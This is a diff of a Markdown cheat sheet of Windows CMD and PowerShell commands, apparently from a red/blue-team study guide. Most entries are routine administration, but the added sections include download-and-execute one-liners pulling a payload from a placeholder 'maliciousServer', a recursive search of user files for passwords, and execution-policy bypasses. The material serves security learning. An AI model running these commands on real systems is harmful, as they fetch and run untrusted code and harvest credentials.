@@ -23,7 +23,8 @@
 <br />
 
 ## BASICS
-- **d:** : change to volume D
+- **d:** :
+   - change to volume D
 - **cd**: change directory
    - `cd %userprofile%`
    - `cd %APPDATA%`
@@ -172,35 +173,45 @@
 # WINDOWS POWERSHELL
 ## TABLE OF CONTENTS
 1. [PS BASICS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#ps-basics)
-2. [PS NETWORK](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#ps-network)
-3. [USEFUL COMMANDS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#useful-commands)
-
-<br />
-
-**Powershell = PS**
+2. [PS CONFIGURATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#ps-configuration)
+3. [PS NETWORK](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#ps-network)
+4. [PS DATA / FILE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#data--file)
+5. [PS SECURITY / ENCRYPTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#security--encryption)
+6. [PS USER / GROUPS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#user--groups)
+7. [PS SYSTEM](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#system)
+8. [CODE EXAMPLES (CMDLETS)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Windows.md#code-examples-cmdlets)
 
 <br />
 
 ## PS BASICS
 - **get-help**
    - `get-help [command] OPTION`
-     - OPTION = `-examples` / `-detailed` / `-full` etc.
+   - `get-help [command] -examples`
+   - `get-help [command] -detailed`
+   - `get-help [command] -full`
    - `help [command]`
 - **manage-bde**
    - `manage-bde /?`: open BitLocker menu
 - **get-command**
-   - Exp: `get-command -module [module name]`: 
-     - module names = netsecurity, defender etc. 
+   - `get-command -module [module name]`
+   - `get-command -module netsecurity`
+   - `get-command -module defender`
 - **stop-service**
-   - Exp: `stop service -Name [Spooler] -Force`
+   - `stop service -Name [Spooler] -Force`
 - **set-service**
-   - Exp: `set-service -Name [Spooler] -StartupType Disabled`
+   - `set-service -Name [Spooler] -StartupType Disabled`
 - **get-content**: Get content of item 
    - `get-content` or `gc`
 - **get-itemproperty**
-   - Exp: `Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {($_.DisplayName -eq "name")}`
+   - `Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {($_.DisplayName -eq "name")}`
 - **PS Command History**:
    - `C:\Users\%USER%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`
+- **Execute File in PowerShell**
+   - [Details: social.technet.microsoft.com](https://social.technet.microsoft.com/wiki/contents/articles/7703.powershell-running-executables.aspx)
+   - Direct: `.\testapp.exe`
+- **Import Module**
+   - `Import-Module <modulepath>`
+   - `Get-Command -Module <modulename>`: List all commands of module
 
 <br />
 
@@ -218,38 +229,9 @@
 
 <br />
 
-## USEFUL COMMANDS
-#### Update Package (Exp: Powershellget)
-1. `Install-PackageProvider -Name NuGet -Force`
-2. `Install-Module -Name PowerShellGet -Force`
-3. `Update-Module -Name PowerShellGet`
-4. Verify: `Get-Module -ListAvailable (PowerShellGet)`
-
-#### Disable/Remove Features 
-- `Disable-WindowsOptionalFeature -FeatureName "feature" -Online -NoRestart`
-   - `-Online` = the currently running Windows
-
-#### Execution Policy
-- `Get-ExecutionPolicy -List | Format-Table -AutoSize`: List execution policy
-- `Set-ExecutionPolicy -ExecutionPolicy Restricted/RemoteSigned/Undefined/AllSigned`: Set execution policy   
-- **Evade PowerShell Execution Policy (3 Options)**
-   1. `Get-Content runme.ps1 | Invoke-Expression` (Alternative: `GC runme.ps1 | iex`)
-   2. `PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1`
-   3. `PowerShell.exe -ExecutionPolicy Unrestricted -File .runme.ps1`
-
-#### Users/Groups
-- `Search-ADAccount –AccountInactive –UsersOnly`: Find unused accounts in Active Directory
-
-#### System
-- `wsl --help`: Windows Subsystem for Linux
-   - command overview: [https://aka.ms/wslstore](https://aka.ms/wslstore)
-
-#### Execute File in PowerShell
-- [Details: social.technet.microsoft.com](https://social.technet.microsoft.com/wiki/contents/articles/7703.powershell-running-executables.aspx)
-- Direct: `.\testapp.exe`
-
-#### Remove User Jumplists 
-- **gci** (get-ChildItem): show files in one or more specified locations
+## PS DATA / FILE
+- **Remove User Jumplists**
+   - `gci` / `get-ChildItem`: Show files in one or more specified locations
 ```
 $profiles = gci \\server\share
 foreach ($profile in $profiles)
@@ -257,9 +239,54 @@ foreach ($profile in $profiles)
 gci ($profile.fullname + '\UPM_Profile\AppData\Roaming\Microsoft\Windows\Recent\') | Where-Object LastWriteTime -lt (get-date).AddDays(-7) | remove-item -Force -Recurse
 }
 ```
+- **Search for Sensitive Data**
+   ```
+   Get-ChildItem -Path "c:\users\" -Recurse -Force -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf, *.ppt, *.pptx | Select-String "[P|p]assword" |    
+   Select-Object Path, Line, LineNumber | Export-Csv "c:\Users\%USER%\Desktop\passwordPII.csv"
+   ```
+- **Script Execution**
+   - `iex New-Object NEt.Webclient).DownloadString('http://maliciousServer/payload.ps1')`: iex = invoke executable
+   - PSv3 onwards: `iex (iwr 'http://maliciousServer/payload.ps1')`
 
-#### Search for Sensitive Data 
-- `Get-ChildItem -Path "c:\users\" -Recurse -Force -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf, *.ppt, *.pptx | Select-String "[P|p]assword" | Select-Object Path, Line, LineNumber | Export-Csv "c:\Users\%USER%\Desktop\passwordPII.csv"`
+<br />
+
+## PS USER / GROUPS
+- `Search-ADAccount –AccountInactive –UsersOnly`: Find unused accounts in Active Directory
+
+<br />
+
+## PS SYSTEM
+- **Disable/Remove Features**
+- `Disable-WindowsOptionalFeature -FeatureName "feature" -Online -NoRestart`
+   - `-Online` = the currently running Windows
+- **Update Package (Exp: Powershellget)**
+   - `Install-PackageProvider -Name NuGet -Force`
+   - `Install-Module -Name PowerShellGet -Force`
+   - `Update-Module -Name PowerShellGet`
+   - `Get-Module -ListAvailable (PowerShellGet)`: Verify
+- **WSL**
+   - Windows Subsystem for Linux
+   - `wsl --help` 
+   - command overview: [https://aka.ms/wslstore](https://aka.ms/wslstore)
+- **Execution Policy**
+   - It's not a security layer (!)
+   - Instead it prevents users from executing scripts accidently
+   - `Get-ExecutionPolicy -List | Format-Table -AutoSize`: List execution policy
+   - `Set-ExecutionPolicy -ExecutionPolicy Restricted/RemoteSigned/Undefined/AllSigned`: Set execution policy   
+   - **Execution Policy Bypass**
+      - `Get-Content runme.ps1 | Invoke-Expression` (Alternative: `GC runme.ps1 | iex`)
+      - `PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1`
+      - `PowerShell.exe -ExecutionPolicy Unrestricted -File .runme.ps1`
+      - `powershell -c <cmd>`
+
+<br />
+
+## CODE EXAMPLES (CMDLETS)
+- Cmdlets return a .NET object after execution
+- Cmdlets are not executables
+- They have aliases
+- `Get-Command -CommandType cmdlet`: Get list of cmdlets
+
 
 <br />
 
